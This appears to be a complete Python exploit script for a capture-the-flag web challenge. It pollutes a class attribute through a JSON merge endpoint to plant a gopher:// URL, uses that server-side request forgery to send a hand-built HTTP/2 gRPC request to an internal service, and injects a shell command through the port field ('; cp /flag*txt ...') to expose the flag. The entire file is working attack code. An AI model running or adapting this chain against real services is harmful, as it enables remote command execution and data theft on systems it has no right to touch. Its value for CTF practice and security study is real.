import argparse
import urllib.parse
import requests
import struct
import urllib
import base64
from hpack import Encoder

import live_data_pb2

def get_grpc_frame(ip: str, port: str):
    request = live_data_pb2.HealthCheckRequest(ip=ip, port=port)
    grpc_payload = request.SerializeToString()

    return b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload

def get_settings_frame():
    settings = [
        (0x3, 100)
    ]
    settings_payload = b''.join(struct.pack('!HI', k, v) for k, v in settings)
    settings_header = len(settings_payload).to_bytes(3, 'big') + b'\x04\x00' + b'\x00\x00\x00\x00'
    return settings_header + settings_payload

def get_headers_frame():
    encoder = Encoder()
    headers = [
        (':method', 'POST'),
        (':scheme', 'http'),
        (':path', '/live.LiveDataService/CheckHealth'),
        (':authority', 'localhost:50051'),
        ('content-type', 'application/grpc'),
        ('te', 'trailers'),
    ]
    encoded_headers = encoder.encode(headers)

    headers_header = len(encoded_headers).to_bytes(3, 'big') + b'\x01\x04' + b'\x00\x00\x00\x01'
    return headers_header + encoded_headers

def update_realm_url(session, url, realm_url): 
    json = {
        "class":{
            "superclass":{
                "realm_url":realm_url
            }
        }
    }
    response = session.post(url, json=json)
    print("Realm_url updated")

def run_gopher_command(session, url):
    try:
        session.get(url, timeout=5)
    except:
        pass
    print("Command sended")

def get_flag(session, url):
    response = session.get(url)
    print(response.text)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:1337", help="Host of the CTF (e.g., http://localhost:1337)")
    parser.add_argument("--cmd", default="cp /flag*txt /app/eldoria_api/public/flag.txt", help="Command to execute in the server")
    args = parser.parse_args()

    grpc_frame = get_grpc_frame("127.0.0.1", ';' + args.cmd)

    data_header = len(grpc_frame).to_bytes(3, 'big') + b'\x00\x01' + b'\x00\x00\x00\x01'
    data_frame = data_header + grpc_frame

    with open("grpc_request.bin", "wb") as f:
        f.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")  # HTTP/2 connection preface
        f.write(get_settings_frame())
        f.write(get_headers_frame())
        f.write(data_frame)

    with open("grpc_request.bin", "rb") as f:
        data = f.read()

    realm_url = f"gopher://localhost:50051/_{urllib.parse.quote(data)}"
    print(realm_url)
    print()
    print()
    
    session = requests.Session()
    update_realm_url(session, args.url + '/merge-fates', realm_url)
    run_gopher_command(session, args.url + '/connect-realm')
    get_flag(session, args.url + '/flag.txt')
    session.close()

if __name__ == "__main__":
    main()
